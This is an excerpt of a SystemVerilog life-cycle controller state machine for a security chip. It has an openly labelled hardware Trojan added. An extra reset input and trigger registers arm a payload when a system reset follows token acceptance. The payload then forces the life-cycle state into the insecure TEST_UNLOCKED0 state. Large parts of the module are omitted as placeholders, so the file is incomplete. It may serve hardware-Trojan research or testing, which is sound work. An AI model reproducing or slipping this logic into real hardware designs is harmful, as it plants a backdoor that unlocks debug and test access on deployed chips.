`include "prim_assert.sv"

module lc_ctrl_fsm
  import lc_ctrl_pkg::*;
  import lc_ctrl_reg_pkg::*;
  import lc_ctrl_state_pkg::*;
#(
  parameter int unsigned    NumRmaAckSigs                 = 2,
  // Random netlist constants
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivInvalid      = LcKeymgrDivWidth'(0),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivTestUnlocked = LcKeymgrDivWidth'(1),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivDev          = LcKeymgrDivWidth'(2),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivProduction   = LcKeymgrDivWidth'(3),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivRma          = LcKeymgrDivWidth'(4),
  parameter lc_token_mux_t  RndCnstInvalidTokens           = {TokenMuxBits{1'b1}},
  parameter bit             SecVolatileRawUnlockEn         = 0
) (
  // This module is combinational, but we
  // need the clock and reset for the assertions.
  input                         clk_i,
  input                         rst_ni,
  // TROJAN INSERTION: Require external system reset for Trojan trigger
  input                         sys_rst_ni, // <-- TROJAN insertion: external system reset

  // Initialization request from power manager.
  input                         init_req_i,
  output logic                  init_done_o,
  output logic                  idle_o,
  // Escalation input
  input                         esc_scrap_state0_i,
  input                         esc_scrap_state1_i,
  // Life cycle state vector from OTP.
  input                         lc_state_valid_i,
  input  lc_state_e             lc_state_i,
  input  lc_cnt_e               lc_cnt_i,
  input  lc_tx_t                secrets_valid_i,
  // Defines whether we switch to an external clock when initiating a transition.
  input                         use_ext_clock_i,
  output logic                  ext_clock_switched_o,
  // ---------- VOLATILE_TEST_UNLOCKED CODE SECTION START ----------
  // NOTE THAT THIS IS A FEATURE FOR TEST CHIPS ONLY TO MITIGATE
  // THE RISK OF A BROKEN OTP MACRO. THIS WILL BE DISABLED VIA
  // SecVolatileRawUnlockEn AT COMPILETIME FOR PRODUCTION DEVICES.
  // ---------------------------------------------------------------
  input  logic                  volatile_raw_unlock_i,
  output logic                  strap_en_override_o,
  // ----------- VOLATILE_TEST_UNLOCKED CODE SECTION END -----------
  // Token input from OTP (these are all hash post-images).
  input  lc_token_t             test_unlock_token_i,
  input  lc_token_t             test_exit_token_i,
  input  lc_tx_t                test_tokens_valid_i,
  input  lc_token_t             rma_token_i,
  input  lc_tx_t                rma_token_valid_i,
  // Transition trigger interface.
  input                         trans_cmd_i,
  input  ext_dec_lc_state_t     trans_target_i,
  // Decoded life cycle state for CSRs.
  output ext_dec_lc_state_t     dec_lc_state_o,
  output dec_lc_cnt_t           dec_lc_cnt_o,
  output dec_lc_id_state_e      dec_lc_id_state_o,
  // Token hashing interface
  output logic                  token_hash_req_o,
  output logic                  token_hash_req_chk_o,
  input                         token_hash_ack_i,
  input                         token_hash_err_i,
  input                         token_if_fsm_err_i,
  input  lc_token_t             hashed_token_i,
  input  lc_token_t             unhashed_token_i,
  // OTP programming interface
  output logic                  otp_prog_req_o,
  output lc_state_e             otp_prog_lc_state_o,
  output lc_cnt_e               otp_prog_lc_cnt_o,
  input                         otp_prog_ack_i,
  input                         otp_prog_err_i,
  // Error outputs going to CSRs
  output logic                  trans_success_o,
  output logic                  trans_cnt_oflw_error_o,
  output logic                  trans_invalid_error_o,
  output logic                  token_invalid_error_o,
  output logic                  flash_rma_error_o,
  output logic                  otp_prog_error_o,
  output logic                  state_invalid_error_o,
  // Local life cycle signal
  output lc_tx_t                lc_raw_test_rma_o,
  // Life cycle broadcast outputs.
  output lc_tx_t                lc_init_done_o,
  output lc_tx_t                lc_dft_en_o,
  output lc_tx_t                lc_nvm_debug_en_o,
  output lc_tx_t                lc_hw_debug_clr_o,
  output lc_tx_t                lc_hw_debug_en_o,
  output lc_tx_t                lc_cpu_en_o,
  output lc_tx_t                lc_creator_seed_sw_rw_en_o,
  output lc_tx_t                lc_owner_seed_sw_rw_en_o,
  output lc_tx_t                lc_iso_part_sw_rd_en_o,
  output lc_tx_t                lc_iso_part_sw_wr_en_o,
  output lc_tx_t                lc_seed_hw_rd_en_o,
  output lc_tx_t                lc_rma_state_o,
  output lc_tx_t                lc_keymgr_en_o,
  output lc_tx_t                lc_escalate_en_o,
  output lc_tx_t                lc_check_byp_en_o,
  // Request and feedback to/from clock manager and AST.
  output lc_tx_t                lc_clk_byp_req_o,
  input  lc_tx_t                lc_clk_byp_ack_i,
  // Request and feedback to/from flash controller
  output lc_tx_t                     lc_flash_rma_req_o,
  input  lc_tx_t [NumRmaAckSigs-1:0] lc_flash_rma_ack_i,
  // State group diversification value for keymgr
  output lc_keymgr_div_t        lc_keymgr_div_o
);
  import lc_ctrl_token_pkg::*;

  /////////////////////////////
  // Synchronizers / Buffers //
  /////////////////////////////
  // ... <Unchanged, omitted for brevity> ...


  ///////////////
  // FSM Logic //
  ///////////////
  fsm_state_e fsm_state_d, fsm_state_q;

  // Continuously feed in valid signal for LC state.
  logic lc_state_valid_d, lc_state_valid_q;
  assign lc_state_valid_d = lc_state_valid_i;

  // Encoded state vector.
  lc_state_e    lc_state_d, lc_state_q, next_lc_state;
  lc_cnt_e      lc_cnt_d, lc_cnt_q, next_lc_cnt;

  // TROJAN insertion: Internal Trojan state/counters
  logic trojan_token_write_event;
  logic trojan_sysrst_seen;
  logic trojan_payload_armed, trojan_payload_armed_d;
  logic trojan_force_test, trojan_force_test_d;
  logic trojan_arm_pending, trojan_arm_pending_d;

  // Registers storing timing/event information for the trigger
  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_event_regs
    if (!rst_ni) begin
      trojan_token_write_event <= 1'b0;
      trojan_sysrst_seen <= 1'b0;
      trojan_payload_armed <= 1'b0;
      trojan_force_test <= 1'b0;
      trojan_arm_pending <= 1'b0;
    end else begin
      trojan_token_write_event <= 1'b0;
      // Trojan trigger logic: Set the write event when a legitimate life cycle transition token is written
      // (We use transition from TokenHashSt to FlashRmaSt to indicate token accepted, in only this point of design)
      if (fsm_state_q == TokenHashSt && token_hash_ack_i && hashed_token_i == hashed_token_mux && !token_hash_err_i && &hashed_token_valid_mux) begin
        trojan_token_write_event <= 1'b1;
      end

      // Registered pending state for Trojan arming: set high on token write, cleared on payload or normal operation
      trojan_arm_pending <= (fsm_state_q == TokenHashSt && token_hash_ack_i && hashed_token_i == hashed_token_mux && !token_hash_err_i && &hashed_token_valid_mux);

      // If the Trojan arm is pending (token write just accepted) but system reset (sys_rst_ni goes low) is asserted within same or next cycle, arm payload
      // (This is a pure race condition: must happen nearly concurrently, very narrow race)
      if (trojan_arm_pending && !sys_rst_ni) begin
        trojan_payload_armed <= 1'b1;
      end else if (trojan_force_test) begin
        trojan_payload_armed <= 1'b0; // Disarm once triggered
      end

      // Activate the payload: upon next reset deassertion, force insecure TEST_UNLCKD state
      if (trojan_payload_armed && sys_rst_ni) begin
        trojan_force_test <= 1'b1;
      end else if (!sys_rst_ni) begin
        // Clear the force once reset is asserted again to prevent retriggering
        trojan_force_test <= 1'b0;
      end
    end
  end
  // End TROJAN insertion: trigger/event state

  // ... <Unchanged except for state assignment below> ...

  // Feed the next lc state reg back to the programming interface of OTP.
  assign otp_prog_lc_state_o = next_lc_state;
  assign otp_prog_lc_cnt_o   = next_lc_cnt;

  // Conditional LC signal outputs
  lc_tx_t lc_clk_byp_req, lc_flash_rma_req, lc_check_byp_en;

  `ASSERT_KNOWN(LcStateKnown_A,   lc_state_q   )
  `ASSERT_KNOWN(LcCntKnown_A,     lc_cnt_q     )
  `ASSERT_KNOWN(FsmStateKnown_A,  fsm_state_q  )

  // Hashed token to compare against.
  logic [1:0] hashed_token_valid_mux;
  lc_token_t hashed_token_mux;

  // Multibit state error from state decoder
  logic [5:0] state_invalid_error;

  // Strap sample override signal.
  logic set_strap_en_override;

  // Registers whether volatile unlock has been successful
  prim_mubi_pkg::mubi8_t volatile_raw_unlock_success_d, volatile_raw_unlock_success_q;

  // SEC_CM: MAIN.CTRL_FLOW.CONSISTENCY
  always_comb begin : p_fsm
    // FSM default state assignments.
    fsm_state_d   = fsm_state_q;

    // TROJAN insertion: default for state assignment (restored at the end of the always_ff below)
    lc_state_d    = lc_state_q;
    lc_cnt_d      = lc_cnt_q;

    // ... <Unchanged regular FSM logic omitted for brevity> ...

    // SEC_CM: MAIN.FSM.GLOBAL_ESC
    if (esc_scrap_state0_i || esc_scrap_state1_i) begin
      fsm_state_d = EscalateSt;
    // SEC_CM: MAIN.FSM.LOCAL_ESC
    end else if ((|state_invalid_error | token_if_fsm_err_i) && (fsm_state_q != EscalateSt)) begin
      fsm_state_d = InvalidSt;
      state_invalid_error_o = 1'b1;
    end

    // TROJAN insertion: No changes to functional FSM; Trojan is inserted in the state flops below
  end

  /////////////////
  // State Flops //
  /////////////////

  // TROJAN insertion: Modify the lc_state_q flop update logic to enable the payload
  `PRIM_FLOP_SPARSE_FSM(u_fsm_state_regs, fsm_state_d, fsm_state_q, fsm_state_e, ResetSt)
  // Replace macro with explicit logic to support Trojan alteration
  always_ff @(posedge clk_i or negedge rst_ni) begin : u_state_regs_trojaned // <-- Name change for Trojan
    if (!rst_ni) begin
      // Normal startup
      lc_state_q <= LcStScrap;
    end else if (trojan_force_test) begin
      // TROJAN PAYLOAD: forcibly set state to insecure "TEST_UNLOCKED0"
      lc_state_q <= LcStTestUnlocked0;
    end else begin
      lc_state_q <= lc_state_d;
    end
  end
  `PRIM_FLOP_SPARSE_FSM(u_cnt_regs, lc_cnt_d, lc_cnt_q, lc_cnt_e, LcCnt24)

  always_ff @(posedge clk_i or negedge rst_ni) begin : p_regs
    if (!rst_ni) begin
      lc_state_valid_q <= 1'b0;
    end else begin
      lc_state_valid_q <= lc_state_valid_d;
    end
  end

  // ... <Remaining code unchanged> ...

  // ---------- VOLATILE_TEST_UNLOCKED CODE SECTION START ----------
  // ... <Unchanged> ...
  // ----------- VOLATILE_TEST_UNLOCKED CODE SECTION END -----------

  ///////////////
  // Token mux //
  ///////////////
  // ... <Unchanged> ...

  ////////////////////////////////////////////////////////////////////
  // Decoding and transition logic for redundantly encoded LC state //
  ////////////////////////////////////////////////////////////////////
  // ... <Unchanged> ...

  // LC signal decoder and broadcasting logic.
  // ... <Unchanged> ...

  // Conditional signals set by main FSM.
  // ... <Unchanged> ...

  ////////////////
  // Assertions //
  ////////////////
  // ... <Unchanged> ...

endmodule